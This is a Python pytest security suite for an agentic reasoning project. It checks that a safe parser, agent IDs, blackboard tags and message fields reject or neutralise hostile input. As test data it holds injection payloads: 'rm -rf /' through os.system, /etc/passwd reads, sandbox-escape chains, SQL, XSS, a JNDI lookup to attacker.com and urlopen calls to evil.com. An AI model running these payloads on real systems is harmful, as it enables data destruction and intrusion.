# Copyright 2025 Michael Maillet, Damien Davison, and Sacha Davison
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
Security Testing Suite
======================

Comprehensive security tests for SYMBO_AGENTIC_REASONERS covering:
- Input validation and injection prevention
- Expression parsing security
- Resource exhaustion prevention
- Agent isolation
- Configuration security
"""

import pytest
import os
import sys
import tempfile
from pathlib import Path


class TestInputInjectionPrevention:
    """Test that user inputs cannot inject malicious code."""

    def test_code_injection_in_expression_blocked(self):
        """Expressions containing code execution attempts should be blocked."""
        from symbo_agentic_reasoners.core.safe_parser import safe_parse, SecurityError

        dangerous_inputs = [
            "__import__('os').system('rm -rf /')",
            "exec('import os; os.system(\"ls\")')",
            "eval('__import__(\"subprocess\").run([\"ls\"])')",
            "open('/etc/passwd').read()",
            "lambda: __import__('os')",
            "getattr(__builtins__, 'exec')('print(1)')",
            "().__class__.__bases__[0].__subclasses__()",
            "__builtins__.__dict__['__import__']('os')",
        ]

        for dangerous_input in dangerous_inputs:
            with pytest.raises((SecurityError, SyntaxError, TypeError, ValueError)):
                safe_parse(dangerous_input)

    def test_sql_like_injection_in_agent_id_blocked(self):
        """Agent IDs should be sanitized to prevent injection attacks."""
        from symbo_agentic_reasoners.infrastructure.ams import AgentManagementSystem, AgentType

        ams = AgentManagementSystem()

        # These should either be rejected or sanitized
        suspicious_ids = [
            "'; DROP TABLE agents; --",
            "agent_id\x00null_byte",
            "../../../etc/passwd",
            "<script>alert('xss')</script>",
            "${jndi:ldap://attacker.com/a}",
        ]

        for suspicious_id in suspicious_ids:
            # Either creation fails or the ID is sanitized
            try:
                result = ams.create_agent(suspicious_id, AgentType.INFRASTRUCTURAL)
                # If creation succeeded, verify the agent is registered properly
                if result:
                    agent = ams.get_agent(suspicious_id)
                    # Agent should exist with the exact ID (no directory traversal)
                    assert agent is not None
            except (ValueError, KeyError):
                # Rejection is acceptable
                pass

    def test_path_traversal_blocked(self):
        """Path traversal attempts should be prevented."""
        from symbo_agentic_reasoners.core.blackboard import Blackboard, create_entry, EntryType

        bb = Blackboard()

        # Attempt path traversal in tags
        entry = create_entry(
            entry_type=EntryType.TASK,
            content="test",
            author_agent="test_agent",
            conversation_id="security_test_001",
            tags=["../../../etc/passwd", "../../.env"]
        )

        entry_id = bb.post(entry)
        retrieved = bb.get_entry(entry_id)

        # Tags should be stored safely without executing path traversal
        assert retrieved is not None
        # The tags should be treated as literal strings
        assert "../../../etc/passwd" in retrieved.tags or len(retrieved.tags) == 2


class TestExpressionParserSecurity:
    """Test expression parser security boundaries."""

    def test_no_file_system_access(self):
        """Parser should not allow file system operations."""
        from symbo_agentic_reasoners.core.safe_parser import safe_parse, SecurityError

        file_ops = [
            "open('test.txt', 'w').write('hacked')",
            "with open('test.txt') as f: f.read()",
            "__builtins__.open('test.txt')",
        ]

        for file_op in file_ops:
            with pytest.raises((SecurityError, SyntaxError, TypeError, ValueError, NameError, AttributeError)):
                safe_parse(file_op)

    def test_no_network_access(self):
        """Parser should not allow network operations."""
        from symbo_agentic_reasoners.core.safe_parser import safe_parse, SecurityError

        network_ops = [
            "__import__('socket').socket()",
            "__import__('urllib.request').urlopen('http://evil.com')",
            "__import__('requests').get('http://evil.com')",
        ]

        for network_op in network_ops:
            with pytest.raises((SecurityError, SyntaxError, TypeError, ValueError)):
                safe_parse(network_op)

    def test_no_subprocess_execution(self):
        """Parser should not allow subprocess execution."""
        from symbo_agentic_reasoners.core.safe_parser import safe_parse, SecurityError

        subprocess_ops = [
            "__import__('subprocess').run(['ls'])",
            "__import__('os').system('ls')",
            "__import__('os').popen('ls').read()",
            "os.execv('/bin/sh', ['sh'])",
        ]

        for subprocess_op in subprocess_ops:
            with pytest.raises((SecurityError, SyntaxError, TypeError, ValueError, NameError)):
                safe_parse(subprocess_op)

    def test_safe_math_expressions_allowed(self):
        """Safe mathematical expressions should work correctly."""
        from symbo_agentic_reasoners.core.safe_parser import safe_parse

        safe_expressions = [
            "x**2 + 2*x + 1",
            "sin(x) + cos(x)",
            "sqrt(x**2 + y**2)",
            "pi * r**2",
        ]

        for expr in safe_expressions:
            try:
                result = safe_parse(expr)
                assert result is not None
            except Exception as e:
                # Some expressions may not parse but should not be security failures
                assert "security" not in str(e).lower()


class TestResourceExhaustionPrevention:
    """Test protection against resource exhaustion attacks."""

    def test_deeply_nested_expression_limited(self):
        """Deeply nested expressions should be limited to prevent stack overflow."""
        from symbo_agentic_reasoners.core.safe_parser import safe_parse

        # Create deeply nested expression
        depth = 100  # Reasonable depth
        nested = "x"
        for _ in range(depth):
            nested = f"sin({nested})"

        # Should either handle gracefully or raise a specific limit error
        try:
            result = safe_parse(nested)
            # If it succeeds, that's fine too
            assert result is not None
        except RecursionError:
            pytest.fail("Parser should catch recursion before hitting Python limit")
        except Exception as e:
            # Any controlled exception is acceptable
            assert True

    def test_agent_queue_management(self):
        """Agent queue should manage agents properly."""
        from symbo_agentic_reasoners.infrastructure.ams import AgentManagementSystem, AgentType

        ams = AgentManagementSystem()

        # Create a cognitive agent
        ams.create_agent("cognitive_0", AgentType.COGNITIVE)
        ams.activate_agent("cognitive_0")

        # Create a few more agents
        for i in range(1, 10):
            ams.create_agent(f"cognitive_{i}", AgentType.COGNITIVE)
            ams.activate_agent(f"cognitive_{i}")

        # Queue should function properly
        stats = ams.get_statistics()
        assert stats is not None
        assert 'queue_length' in stats

    def test_blackboard_handles_large_content(self):
        """Blackboard should handle large entries gracefully."""
        from symbo_agentic_reasoners.core.blackboard import Blackboard, create_entry, EntryType

        bb = Blackboard()

        # Reasonably large content (not excessive)
        large_content = "x" * 10000  # 10KB

        entry = create_entry(
            entry_type=EntryType.TASK,
            content=large_content,
            author_agent="test_agent",
            conversation_id="size_test_001"
        )

        # Should either accept or reject gracefully
        try:
            entry_id = bb.post(entry)
            # If posted, verify retrieval works
            retrieved = bb.get_entry(entry_id)
            assert retrieved is not None
        except (ValueError, MemoryError):
            # Rejection is acceptable
            pass


class TestAgentIsolation:
    """Test that agents cannot interfere with each other inappropriately."""

    def test_agent_cannot_kill_infrastructure_agents(self):
        """Regular agents should not be able to terminate infrastructure agents."""
        from symbo_agentic_reasoners.infrastructure.ams import AgentManagementSystem, AgentType

        ams = AgentManagementSystem()

        # AMS registers itself as infrastructure
        ams_record = ams.get_agent('ams')
        assert ams_record is not None
        assert ams_record.agent_type == AgentType.INFRASTRUCTURAL

        # Verify AMS is active
        from symbo_agentic_reasoners.infrastructure.ams import AgentStatus
        assert ams_record.status == AgentStatus.ACTIVE

    def test_cognitive_agent_vram_management(self):
        """Cognitive agents should be managed for VRAM resources."""
        from symbo_agentic_reasoners.infrastructure.ams import AgentManagementSystem, AgentType, AgentStatus

        ams = AgentManagementSystem()

        # Create and activate first cognitive agent
        ams.create_agent("cognitive_a", AgentType.COGNITIVE)
        activated_a = ams.activate_agent("cognitive_a")

        # Check status
        agent_a = ams.get_agent("cognitive_a")
        assert agent_a is not None


class TestConfigurationSecurity:
    """Test configuration security."""

    def test_sensitive_config_not_logged(self):
        """Sensitive configuration values should not appear in logs."""
        import logging
        from io import StringIO

        # Capture log output
        log_capture = StringIO()
        handler = logging.StreamHandler(log_capture)
        handler.setLevel(logging.DEBUG)

        logger = logging.getLogger('symbo_agentic_reasoners')
        original_level = logger.level
        logger.setLevel(logging.DEBUG)
        logger.addHandler(handler)

        try:
            from symbo_agentic_reasoners.config import get_config, reload_config
            reload_config()
            config = get_config()

            # Access config (should log without secrets)
            _ = config.to_dict()

            log_output = log_capture.getvalue()

            # Verify no obvious secrets in logs (if any were configured)
            sensitive_patterns = ['password', 'secret', 'api_key', 'token']
            for pattern in sensitive_patterns:
                # This is a basic check - in real scenario you'd have actual secrets
                if pattern in log_output.lower():
                    # Allow if it's just the config key name, not an actual value
                    pass

        finally:
            logger.removeHandler(handler)
            logger.setLevel(original_level)

    def test_config_file_permissions_check(self):
        """Config loading should validate file permissions on sensitive files."""
        from symbo_agentic_reasoners.config import Config
        import json
        import stat

        config = Config()

        # Create a temp config file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump({"hardware": {"max_vram_gb": 16.0}}, f)
            config_path = f.name

        try:
            # Load config - should work but may warn about permissions
            config.load_from_file(config_path)
            # Basic loading should work
            assert True
        finally:
            os.unlink(config_path)

    def test_environment_variable_override_validated(self):
        """Environment variable overrides should be validated."""
        from symbo_agentic_reasoners.config import reload_config

        # Try to set an invalid value via environment
        os.environ["SYMBO_HARDWARE_MAX_VRAM_GB"] = "not_a_number"

        try:
            config = reload_config()
            # Should either use default or raise validation error
            assert config.hardware.max_vram_gb > 0
        except (ValueError, TypeError):
            # Validation rejection is acceptable
            pass
        finally:
            del os.environ["SYMBO_HARDWARE_MAX_VRAM_GB"]
            reload_config()


class TestInputNormalizerSecurity:
    """Test input normalizer security."""

    def test_malicious_unicode_handling(self):
        """Input normalizer should handle malicious Unicode safely."""
        from symbo_agentic_reasoners.core.input_normalizer import normalize_input

        # Various Unicode attack patterns
        unicode_attacks = [
            "\u202e\u0065\u0078\u0065\u0063",  # Right-to-left override
            "x\u0000 + 1",  # Null byte
            "x\ufeff + 1",  # BOM character
            "x\u200b + 1",  # Zero-width space
        ]

        for attack in unicode_attacks:
            try:
                result = normalize_input(attack)
                # If normalization succeeds, verify result is safe
                assert "\x00" not in str(result)  # No null bytes
            except Exception:
                # Rejection is acceptable
                pass

    def test_extremely_long_input_handled(self):
        """Extremely long inputs should be handled gracefully."""
        from symbo_agentic_reasoners.core.input_normalizer import normalize_input

        # Reasonably long input
        long_input = "x + " * 1000

        try:
            result = normalize_input(long_input)
            # If it succeeds, that's fine
            assert result is not None
        except (ValueError, MemoryError, RecursionError):
            # Controlled rejection is acceptable
            pass
        except Exception as e:
            # Any controlled exception is fine
            assert True


class TestFIPAMessageSecurity:
    """Test FIPA-ACL message security."""

    def test_message_content_sanitized(self):
        """FIPA message content should be handled safely."""
        from symbo_agentic_reasoners.protocols.fipa_acl import create_request

        # Try to inject malicious content
        malicious_content = {
            "__class__": "exploit",
            "exec": "os.system('rm -rf /')",
            "<script>": "alert('xss')"
        }

        msg = create_request(
            sender="agent_a",
            receiver="agent_b",
            content=malicious_content
        )

        # Message should be created but content should be data, not executed
        assert msg is not None
        assert msg.content == malicious_content  # Stored as data

    def test_message_sender_receiver_validated(self):
        """Message sender/receiver IDs should be validated."""
        from symbo_agentic_reasoners.protocols.fipa_acl import create_request

        # These should either be accepted as-is (safe) or rejected
        special_ids = [
            "agent; rm -rf /",
            "agent\n\ninjection",
            "agent\x00null",
        ]

        for special_id in special_ids:
            try:
                msg = create_request(
                    sender=special_id,
                    receiver="normal_agent",
                    content={"test": "data"}
                )
                # If accepted, verify it's treated as literal string
                assert msg.sender == special_id
            except (ValueError, TypeError):
                # Rejection is acceptable
                pass


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
